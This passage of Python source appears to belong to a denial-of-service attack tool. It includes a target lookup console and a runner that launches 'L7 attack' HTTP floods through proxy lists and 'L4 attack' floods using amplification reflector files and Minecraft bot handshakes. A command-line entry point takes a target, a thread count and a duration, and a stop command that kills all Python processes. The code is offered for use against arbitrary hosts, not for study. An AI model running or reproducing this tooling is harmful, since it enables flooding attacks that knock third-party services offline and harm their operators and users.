            while True:
                sleep(1)
                curr = net_io_counters(pernic=False)
                delta = [c - p for p, c in zip(prev, curr)]
                logger.info(
                    f"Sent: {Tools.humanbytes(delta[0])} | "
                    f"Received: {Tools.humanbytes(delta[1])} | "
                    f"Packets Sent: {delta[2]} | "
                    f"Packets Received: {delta[3]} | "
                    f"CPU: {cpu_percent()}% | "
                    f"Memory: {virtual_memory().percent}%"
                )
                prev = curr
        except KeyboardInterrupt:
            pass

    @staticmethod
    def _ping() -> None:
        domain = input("Target: ")
        if not domain:
            return
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
        result = ping(domain, count=5, interval=0.2)
        logger.info(
            f"Address: {result.address} | Avg RTT: {result.avg_rtt}ms | "
            f"Packets: {result.packets_received}/{result.packets_sent} | "
            f"Status: {'ONLINE' if result.is_alive else 'OFFLINE'}"
        )

    @staticmethod
    def _info() -> None:
        domain = input("Target: ")
        if not domain:
            return
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
        logger.info("Fetching info...")
        try:
            resp = Session().get(f"https://ipwhois.app/json/{domain}", timeout=10)
            data = resp.json()
            if data.get("success", True):
                logger.info(
                    f"Country: {data.get('country', 'N/A')} | "
                    f"City: {data.get('city', 'N/A')} | "
                    f"Org: {data.get('org', 'N/A')} | "
                    f"ISP: {data.get('isp', 'N/A')} | "
                    f"Region: {data.get('region', 'N/A')}"
                )
            else:
                logger.error("Info lookup failed")
        except:
            logger.error("Info lookup failed")

    @staticmethod
    def _tssrv() -> None:
        domain = input("Domain: ")
        if not domain:
            return
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
        resolver_obj = resolver.Resolver()
        resolver_obj.timeout = 1
        resolver_obj.lifetime = 1
        records = {"_ts3._udp.": "UDP", "_tsdns._tcp.": "TCP"}
        for rec, proto in records.items():
            try:
                srv = resolver_obj.resolve(rec + domain, "SRV")
                for r in srv:
                    logger.info(f"{proto}: {str(r.target).rstrip('.')}:{r.port}")
            except:
                logger.info(f"{proto}: Not found")

    @staticmethod
    def _check() -> None:
        domain = input("URL: ")
        if not domain:
            return
        if not domain.startswith("http"):
            domain = "http://" + domain
        logger.info("Checking...")
        try:
            resp = Session().get(domain, timeout=10)
            status = "ONLINE" if resp.status_code <= 500 else "OFFLINE"
            logger.info(f"Status Code: {resp.status_code} | Status: {status}")
        except:
            logger.error("Check failed")

class StressRunner:
    @staticmethod
    def run_layer7(method: str, url: URL, threads: int, duration: int, rpc: int, proxy_type: int, proxy_file: Path) -> None:
        host = url.host
        try:
            resolved = gethostbyname(url.host)
            if resolved:
                host = resolved
        except:
            pass
        proxy_list = ProxyManager.load_proxy_file(proxy_file, proxy_type, url, threads) if proxy_file else None
        logger.info(
            f"{bcolors.WARNING}Starting L7 attack: {bcolors.OKBLUE}{method}{bcolors.WARNING} -> {bcolors.OKBLUE}{url}{bcolors.WARNING} "
            f"Duration: {bcolors.OKBLUE}{duration}s{bcolors.WARNING} Threads: {bcolors.OKBLUE}{threads}{bcolors.WARNING} RPC: {bcolors.OKBLUE}{rpc}{bcolors.RESET}"
        )
        async def run():
            flood = AsyncHttpFlood(url, host, method, rpc, duration, proxy_list, USER_AGENTS, REFERERS)
            await flood.start()
        asyncio.run(run())

    @staticmethod
    def run_layer4(method: str, target_ip: str, target_port: int, threads: int, duration: int, reflector_file: Optional[Path] = None, proxy_type: int = 0, proxy_file: Optional[Path] = None) -> None:
        event = Event()
        event.clear()
        reflectors = []
        if reflector_file and reflector_file.exists():
            with reflector_file.open("r") as f:
                reflectors = [line.strip() for line in f if line.strip()]
        proxies = None
        if proxy_file and proxy_file.exists():
            proxies = ProxyManager.load_proxy_file(proxy_file, proxy_type, None, threads)
        protocol_id = CONFIG.get("MINECRAFT_DEFAULT_PROTOCOL", 74)
        if method == "MCBOT":
            try:
                sock = socket(AF_INET, SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                handshake = Layer4._minecraft_data(
                    Layer4._minecraft_varint(0x00),
                    Layer4._minecraft_varint(protocol_id),
                    Layer4._minecraft_data(target_ip.encode()),
                    Layer4._minecraft_short(target_port),
                    Layer4._minecraft_varint(1),
                )
                sock.send(handshake)
                sock.send(Layer4._minecraft_data(b"\x00"))
                data = sock.recv(1024)
                match = Tools.PROTOCOL_PATTERN.search(str(data))
                if match:
                    protocol_id = int(match.group(1))
                sock.close()
            except:
                pass
        logger.info(
            f"{bcolors.WARNING}Starting L4 attack: {bcolors.OKBLUE}{method}{bcolors.WARNING} -> {bcolors.OKBLUE}{target_ip}:{target_port}{bcolors.WARNING} "
            f"Duration: {bcolors.OKBLUE}{duration}s{bcolors.WARNING} Threads: {bcolors.OKBLUE}{threads}{bcolors.RESET}"
        )
        for _ in range(threads):
            Layer4((target_ip, target_port), reflectors, method, event, proxies, protocol_id).start()
        event.set()
        sleep(duration)
        event.clear()

def main() -> None:
    with suppress(KeyboardInterrupt):
        if len(argv) < 2:
            ToolsConsole.usage()
            return
        cmd = argv[1].upper()
        if cmd == "HELP":
            ToolsConsole.usage()
            return
        if cmd == "TOOLS":
            ToolsConsole.run_console()
            return
        if cmd == "STOP":
            for proc in process_iter():
                if proc.name() in {"python", "python3"}:
                    proc.kill()
            return
        method = cmd
        if method not in Methods.ALL_METHODS:
            log_exit(f"Method not found: {method}")
        if method in Methods.LAYER7_METHODS:
            if len(argv) < 8:
                log_exit("Usage: python3 script.py <method> <url> <proxy_type> <threads> <proxy_file> <rpc> <duration>")
            url_raw = argv[2].strip()
            if not url_raw.startswith(("http://", "https://")):
                url_raw = "http://" + url_raw
            url = URL(url_raw)
            proxy_type = int(argv[3])
            threads = int(argv[4])
            proxy_file = Path(BASE_DIR / "files" / "proxies" / argv[5])
            rpc = int(argv[6])
            duration = int(argv[7])
            StressRunner.run_layer7(method, url, threads, duration, rpc, proxy_type, proxy_file)
        elif method in Methods.LAYER4_METHODS:
            if len(argv) < 5:
                log_exit("Usage: python3 script.py <method> <ip:port> <threads> <duration> [reflector_file|proxy_type proxy_file]")
            target = argv[2]
            if ":" not in target:
                log_exit("Invalid target format. Use ip:port")
            target_ip, target_port_str = target.split(":", 1)
            try:
                target_port = int(target_port_str)
            except:
                log_exit("Invalid port")
            threads = int(argv[3])
            duration = int(argv[4])
            reflector_file = None
            proxy_type = 0
            proxy_file = None
            if len(argv) >= 6:
                arg5 = argv[5]
                if method in Methods.LAYER4_AMP:
                    reflector_file = Path(BASE_DIR / "files" / arg5)
                    if not reflector_file.exists():
                        log_exit(f"Reflector file not found: {reflector_file}")
                elif arg5.isdigit() and len(argv) >= 7:
                    proxy_type = int(arg5)
                    proxy_file = Path(BASE_DIR / "files" / "proxies" / argv[6])
            StressRunner.run_layer4(method, target_ip, target_port, threads, duration, reflector_file, proxy_type, proxy_file)
        else:
            log_exit(f"Unknown method: {method}")

if __name__ == "__main__":
    main()
